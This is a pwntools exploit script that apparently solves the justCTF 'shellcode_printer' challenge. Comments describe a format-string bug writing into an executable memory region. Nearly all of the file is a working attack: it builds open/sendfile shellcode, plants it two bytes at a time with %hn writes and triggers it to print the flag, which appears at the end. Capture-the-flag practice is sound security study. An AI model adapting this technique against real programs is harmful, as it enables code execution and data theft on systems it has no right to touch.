from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./shellcode_printer', '''
    break-rva 0x145b
    continue
''')

# p = remote('shellcode-printer.nc.jctf.pro', 1337)

# this challenge does following things:
# mmap a readable, writable, and executable region, whose address is initially stored on stack
# enter a while loop calling fgets to read data from stdin (0x10-1 bytes at most)
# if input is not empty, it will add 2 to mmaped region address on stack (move 2 bytes forward), and then call fprintf to print input data to /dev/null (fmtstr vulnerability)
# otherwise, if input is empty, it will view current mmaped region address as a function pointer, directly call it, and then break while loop

# shellcode of cat flag.txt must have 'jmp main' instruction in the end
shellcode = asm('''
    main:
        /* push b'flag.txt\x00' */
        push 1
        dec byte ptr [rsp]
        mov rax, 0x7478742e67616c66
        push rax
        /* call open('rsp', 'O_RDONLY', 'rdx') */
        push 2
        pop rax
        mov rdi, rsp
        xor esi, esi /* O_RDONLY */
        syscall
        /* call sendfile(1, 'rax', 0, 0x7fffffff) */
        mov r10d, 0x7fffffff
        mov rsi, rax
        push 40
        pop rax
        push 1
        pop rdi
        cdq
        syscall
        nop
        hlt
    jump:
        jmp main
''')
# write shellcode of cat flag.txt to executable two bytes at a time using fmtstr
for i in range(0, len(shellcode), 2):
    # 6th argument of fprintf (rsp+8 here) is current mmaped region address, write current two bytes of shellcode to where it points to
    p.sendlineafter(b': ', f"%{u16(shellcode[i:i+2])}c%6$hn".encode())
# use an empty input to call current mmaped region address as a function, where 'jmp main' instruction will be executed immediately
p.sendlineafter(b': ', b'')

p.interactive()

# justCTF{l0w_0n_cy4n_pl34s3_r3f1ll}